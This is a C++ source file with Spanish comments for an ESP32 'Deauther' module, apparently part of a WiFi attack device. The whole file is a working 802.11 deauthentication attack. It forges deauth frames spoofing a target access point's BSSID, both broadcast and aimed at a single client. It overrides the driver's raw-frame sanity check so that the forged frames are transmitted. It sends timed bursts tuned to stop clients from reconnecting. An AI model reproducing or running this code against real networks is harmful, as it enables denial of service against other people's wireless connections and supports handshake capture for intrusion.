#include "Deauther.h"
#include <WiFi.h>
#include <string.h>
#include "esp_wifi.h"
#include "WiFiScanner.h"   // para rearmar el callback de promiscuo
#include "EventLog.h"      // para loguear fallos sostenidos

// Ritmo del ataque, local a este archivo a proposito (no depende de
// que el header declare nada): cada cuanto sale una rafaga, cuantas
// tramas lleva y cuanto se espacia cada una. 20 tramas cada 40ms
// alcanza para que un cliente normal no llegue a reautenticar entre
// rafaga y rafaga, sin saturar el aire.
//
// ESPACIO_US bajo de 500 a 250: con 500 el loop() quedaba bloqueado
// 10ms por rafaga (20 x 500us) cada 40ms, o sea ~25% del tiempo, y
// eso se notaba en la fluidez de la mascota y en el drenaje de los
// buffers de PCAP/EAPOL. 250us sigue siendo suficiente para no
// saturar el aire.
static const unsigned long INTERVALO_MS          = 40;
static const int           RAFAGA                = 20;
static const unsigned long ESPACIO_US            = 250;
static const unsigned long FALLOS_CONSECUTIVOS_MAX = 200; // ~10 rafagas seguidas fallando

// El driver valida las tramas crudas antes de transmitirlas y
// descarta las que no le cierran. Esta funcion es un simbolo debil de
// la libreria de WiFi: redefinirla para que devuelva siempre 0
// desactiva esa validacion y deja pasar la trama tal cual la armamos.
// (Sigue existiendo en la 2.0.17 que trae espressif32 6.9.0, que es
// la que fija el platformio.ini.)
//
// El __real_ se declara por si en algun momento se quiere debuggear
// llamando al original, pero por defecto NO se usa: el linker lo
// resuelve solo cuando el flag --wrap esta presente en platformio.ini
// (ahora esta en los 4 entornos).
extern "C" int __real_ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t);
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

void Deauther::begin() {
    // Sin inicializacion de radio a proposito (ver el .h):
    // scanner.begin() ya dejo WIFI_MODE_STA y el promiscuo armados, y
    // se llama ANTES que esto en setup().
    atacando = false;
    enviados = 0;
    fallidos = 0;
    fallidosConsecutivos = 0;
    estado = DEAUTH_IDLE;
}

bool Deauther::asegurarPromiscuo() {
    bool encendido = false;
    if (esp_wifi_get_promiscuous(&encendido) != ESP_OK) return false;
    if (!encendido) {
        // Un escaneo activo apaga el promiscuo y lo vuelve a prender
        // cuando termina. Si el ataque arranca justo en el medio, o si
        // algo lo apago por debajo, esto lo rearma.
        if (esp_wifi_set_promiscuous(true) != ESP_OK) return false;
        rearmarCallbackPromiscuo();
    }
    return true;
}

void Deauther::rearmarCallbackPromiscuo() {
    // WiFiScanner expone su callback como static publico (ver
    // WiFiScanner.h). Re-armarlo aca cubre el caso raro en que el
    // promiscuo quedo prendido pero sin callback (pasa con algunos
    // scans de WiFi.scanNetworks en ciertos cores).
    esp_wifi_set_promiscuous_rx_cb(WiFiScanner::promiscuousCallbackPublico);
}

void Deauther::construirTrama() {
    trama.fc[0] = 0xC0;   // management
    trama.fc[1] = 0x00;   // subtipo 0x0C = deauth
    trama.dur = 0;
    memcpy(trama.src, bssidObjetivo, 6);
    memcpy(trama.bssid, bssidObjetivo, 6);
    trama.seq = 0;

    if (modoBroadcast) {
        // Broadcast va con reason 1 ("sin especificar"). El 7 no sirve
        // aca: significa "trama de clase 3 desde una estacion no
        // asociada" y espera una MAC concreta en addr1.
        memset(trama.dest, 0xFF, 6);
        trama.reason = 1;
    } else {
        memcpy(trama.dest, clienteObjetivo, 6);
        trama.reason = 7;
    }
}

bool Deauther::iniciar(const uint8_t* bssid, int canal, const uint8_t* cliente, bool broadcast) {
    if (!bssid) return false;
    if (canal < 1 || canal > 13) return false;
    if (!broadcast && !cliente) return false;
    // Sin la interfaz STA arrancada no hay WIFI_IF_STA donde inyectar.
    if (WiFi.getMode() == WIFI_MODE_NULL) return false;

    if (atacando) detener();

    memcpy(bssidObjetivo, bssid, 6);
    if (!broadcast) memcpy(clienteObjetivo, cliente, 6);
    canalObjetivo = canal;
    modoBroadcast = broadcast;

    if (!asegurarPromiscuo()) return false;

    // El canal se fija al arrancar. Si el radio se queda en el canal
    // donde lo dejo el ultimo escaneo, el AP objetivo no ve nada.
    if (esp_wifi_set_channel(canalObjetivo, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        Serial.printf("Deauth: canal %d no disponible en esta region\n", canalObjetivo);
        estado = DEAUTH_DETENIDO_POR_ERROR;
        return false;
    }

    construirTrama();
    enviados = 0;
    fallidos = 0;
    fallidosConsecutivos = 0;
    ultimoEnvio = 0;
    atacando = true;
    estado = DEAUTH_ATACANDO;
    return true;
}

void Deauther::detener() {
    atacando = false;
    estado = DEAUTH_IDLE;
    // Limpiar objetivos para que getCanal()/esBroadcast() no devuelvan
    // datos viejos despues de detener.
    memset(bssidObjetivo, 0, 6);
    memset(clienteObjetivo, 0, 6);
    canalObjetivo = 0;
    fallidosConsecutivos = 0;
}

void Deauther::update() {
    if (!atacando) return;
    if (millis() - ultimoEnvio < INTERVALO_MS) return;
    ultimoEnvio = millis();

    // Revalidar en cada rafaga: entre una y otra pudo pasar un conteo
    // de clientes o un cambio de canal y dejarnos en otro lado. Sin
    // esto el ataque se queda mudo sin devolver ningun error visible.
    if (!asegurarPromiscuo()) {
        estado = DEAUTH_DETENIDO_POR_ERROR;
        detener();
        return;
    }

    uint8_t canalActual = 0;
    wifi_second_chan_t segundoCanal;
    if (esp_wifi_get_channel(&canalActual, &segundoCanal) == ESP_OK &&
        canalActual != canalObjetivo) {
        esp_wifi_set_channel(canalObjetivo, WIFI_SECOND_CHAN_NONE);
    }

    for (int i = 0; i < RAFAGA; i++) {
        if (esp_wifi_80211_tx(WIFI_IF_STA, &trama, sizeof(trama), false) == ESP_OK) {
            enviados++;
            fallidosConsecutivos = 0;
        } else {
            fallidos++;
            fallidosConsecutivos++;
        }
        delayMicroseconds(ESPACIO_US);
    }

    // Auto-deteccion de fallos sostenidos: si el driver rechaza 200
    // tramas seguidas (~10 rafagas), algo se rompio de verdad (canal
    // perdido, promiscuo apagado por otro modulo, region invalida).
    // Mejor detener y avisar que seguir inyectando a la nada.
    if (fallidosConsecutivos >= FALLOS_CONSECUTIVOS_MAX) {
        Serial.println("Deauth: demasiados fallos consecutivos, deteniendo");
        eventos.registrar("Deauth: detenido por fallos del driver", nullptr);
        estado = DEAUTH_DETENIDO_POR_ERROR;
        detener();
        return;
    }

    // Aviso periodico de fallos (cada 100) sin llenar el EventLog.
    if (fallidos > 0 && fallidos % 100 == 0) {
        eventos.registrar("Deauth: 100 fallos acumulados", nullptr);
    }

    // Estado "fallando" para que la UI lo pueda mostrar (aunque el
    // ataque siga activo). Se prende si en la ultima rafaga hubo mas
    // fallos que exitos.
    if (fallidosConsecutivos > RAFAGA / 2) {
        estado = DEAUTH_FALLANDO;
    } else if (atacando) {
        estado = DEAUTH_ATACANDO;
    }
}
